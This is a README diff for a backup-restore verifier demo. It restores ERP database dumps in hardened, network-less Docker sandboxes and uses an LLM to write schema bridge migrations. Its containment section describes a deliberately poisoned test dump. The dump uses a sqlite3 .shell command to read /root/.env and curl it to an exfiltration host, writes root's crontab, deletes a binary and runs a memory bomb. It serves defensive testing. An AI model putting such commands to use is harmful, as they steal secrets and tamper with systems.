@@ -1,8 +1,8 @@
-# Restorer
+# BackupAirlock
 
-Nightly ERP backup: prove the books balance after restore. A restore drill
-turns an ERP backup plus a recovery goal into a verified **Recovery Proof**;
-every restore attempt runs in a disposable sandbox, never in the control plane.
+**BackupAirlock is an autonomous disaster-recovery verifier that restores database backups against multiple application codebase versions inside sealed, throwaway sandboxes, proving business-logic integrity, auto-generating bridge migrations for version drift, and quarantining poisoned dumps before they ever touch production.**
+
+(Repo and service name: `restorer`. Team spec: `BACKUPAIRLOCK-SPEC.md`.)
 
 The demo ERP is Nordvik Handel AB, a small Swedish trading company (SEK, 25 %
 VAT, 200 customers, ~2,000 invoices, double-entry journal, stock), on Odoo's
@@ -15,7 +15,27 @@ Postgres dump and needs a Postgres sandbox image; the drill is the same.
 
 Live demo: https://vps.taild101c7.ts.net:10000/restorer/
 
-## How a drill runs
+## The Backup x App Version Compatibility Matrix (headline run)
+
+Rows: `v1_legacy.sql` (night before the ERP upgrade, schema v1), `v2_current.sql` (last night, schema v2), `poisoned_dump.sql` (last night's dump with three attacks spliced in), plus an optional uploaded `.sql` (raw POST to `/api/uploads`, 25 MB cap). Columns: **ERP app v1.0** and **v2.0** (`apps/erp_v1`, `apps/erp_v2`): real small apps with a data layer (stdlib HTTP + SQLite), v2.0 reading the upgraded Odoo fields.
+
+Every cell is its own sandbox: restore the dump into an empty database, boot that app version on it, run `apps/suite.py`, the deterministic business-logic suite, over loopback:
+1. **API health**: `GET /api/dashboard` returns 200 from the booted app.
+2. **User login (hash check)**: the bookkeeper logs in through the app (pbkdf2-sha512 in `res_users`), a wrong password is refused.
+3. **Ledger + invoice math**: debits = credits; every invoice's lines + VAT = its total, as the app reads them.
+4. **FK integrity**: `PRAGMA foreign_key_check` is empty.
+
+The database comes back and the control plane re-checks the books itself (the suite ran next to an untrusted dump): the full manifest where one exists (both cells on app v2.0: reference migration in `fixtures/build.py`), else books balance + orphans.
+
+States: **GREEN native** / **RED drift** (`v1_legacy.sql` on v2.0: `no such column: move_type`) → **YELLOW healing**: Vultr Serverless Inference reads backup schema vs app schema + the failing tests and writes `bridge_v1_to_v2.sql`; a new sandbox loads the dump into its own schema, applies the bridge, boots the app, reruns the suite; failures (sandbox error or failed tests/checks) go back for a repair, up to 3 rounds → **GREEN healed**, bridge downloadable. Drift is healed both ways (`bridge_v2_to_v1.sql` for a rollback). A dump that shares under half the app's tables is "not this app's database", no model call.
+
+**Containment moment**: `poisoned_dump.sql` runs, through the sqlite3 CLI, `.shell cat /root/.env; curl ... --data-binary @/root/.env https://exfil...`, then writes `/etc/crontabs/root` and deletes `/usr/bin/sqlite3`, then a recursive CTE memory bomb. Live badges from the sandbox's output and cgroup: NETWORK AIR-GAP ENFORCED (0 bytes exfiltrated), READ-ONLY ROOTFS PROTECTED, MEMORY/TIMEOUT CAP HIT (512 MB / 20 s) · CONTAINER DESTROYED; the honey file is a decoy planted in the image, no real secret is in any sandbox. Verdict **QUARANTINED: DO NOT RESTORE TO PROD**; forensic incident log (`/api/runs/<id>/incident.json`: static scan with line numbers, per-sandbox containment events, stderr, exit, destroyed).
+
+**DR Readiness Certificate** (`proof.json` / `proof.html` of a matrix run): per backup its SHA-256, status (DR READY / QUARANTINED / NOT RESTORABLE), passing app versions native or via which bridge (+ bridge sha256), every suite and control-plane result, restored database sha256, sandbox receipts, model calls; the certificate is itself hashed.
+
+Sandbox flags (all runs): `--network none --read-only --cap-drop ALL --security-opt no-new-privileges --memory 512m --memory-swap 512m --cpus 1 --pids-limit 64`, tmpfs `/work` 64 MB, uid nobody, 20 s wall clock for matrix cells. Runtime: hardened Docker (gVisor `runsc` was not installable here: the release download URLs return 404).
+
+## How a single drill runs
 
 1. The backup is fingerprinted (sha256) and mounted read-only.
 2. Vultr Serverless Inference (`glm-5.3`, fallback `deepseek-v4.1-flash-1017`) writes a plan and a restore script from the backup's catalog.
@@ -32,12 +52,14 @@ Fixtures (`fixtures/build.py`, a seeded day-by-day simulation of the company's y
 
 | File | What |
 |---|---|
-| `app.py` | FastAPI control plane: drill pipeline, LLM calls, SSE events, proof downloads |
+| `app.py` | FastAPI control plane: matrix and drill pipelines, uploads, LLM calls, SSE events, certificate / bridge / incident downloads |
+| `apps/erp_v1/`, `apps/erp_v2/` | the two ERP app versions booted in the sandbox (`erp.py`; `schema.sql` generated by `fixtures/build.py`) |
+| `apps/suite.py` | the business-logic suite run against the booted app |
 | `sandbox.py` | hardened Docker runner, live CPU/memory from the container cgroup |
 | `verify.py` | the deterministic checks: five on the books, five against the manifest |
 | `static/index.html` | the single-page UI (relative paths, works under any prefix) |
-| `fixtures/build.py` | simulates the ERP, builds the four fixtures + their manifests, incl. the reference v1 to v2 migration |
-| `sandbox.Dockerfile` | sandbox image (alpine + sqlite) |
+| `fixtures/build.py` | simulates the ERP, builds the matrix dumps + the four drill fixtures + their manifests, incl. the reference v1 to v2 migration |
+| `sandbox.Dockerfile` | sandbox image `restorer-sandbox:2` (alpine + sqlite, python3, curl, honey `/root/.env`) |
 | `install.sh` | one-command install on a Vultr VM |
 | `shoot.js` | headless end-to-end run of all fixtures with screenshots into `shots/` |
 
@@ -59,5 +81,7 @@ Env vars: `VULTR_INFERENCE_KEY` (required), `RESTORER_HOST` (default 127.0.0.1; 
 
 - Sandbox is hardened Docker, not a microVM: the build host has no KVM. On a VM with nested virtualisation, swap `sandbox.py`'s `docker run` for Microsandbox/Firecracker; nothing else changes.
 - The control plane talks to the Docker daemon, which is root-equivalent; it is never exposed to the sandbox.
-- One drill at a time (409 otherwise); a chain drill runs up to 10 sandboxes at once inside it. No auth, by design for the demo.
+- One drill at a time (409 otherwise); a chain drill runs up to 10 sandboxes at once, a matrix 6-8. No auth, by design for the demo.
+- In the matrix a cell that trips any containment signal (or a dump with CLI commands found by the static scan) is quarantined; so is an honest dump that needs more than 512 MB or 20 s, by design at these caps.
+- The business-logic suite runs inside the sandbox next to the restored, untrusted data; that is why the control plane re-checks the books on the returned database. Not built: the spec's optional plain-English rule to assertion.
 - The chain builds one migration per run and refuses a chain whose old nights span more than one old schema.
